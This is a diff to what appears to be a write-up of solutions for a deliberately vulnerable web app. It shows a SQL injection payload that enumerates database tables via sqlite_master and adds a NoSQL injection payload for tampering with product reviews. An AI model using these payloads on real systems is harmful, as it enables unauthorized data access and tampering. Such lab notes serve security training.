@@ -14,3 +14,6 @@
 
     URL encoded: `a')) UNION SELECT 1, tbl_name, "a", 1, 2, null, null, null, null FROM sqlite_master WHERE type="table" --`
 
+5. Edit review `PATCH /rest/products/reviews`:
+
+   `"id": {"$ne": "a"},`
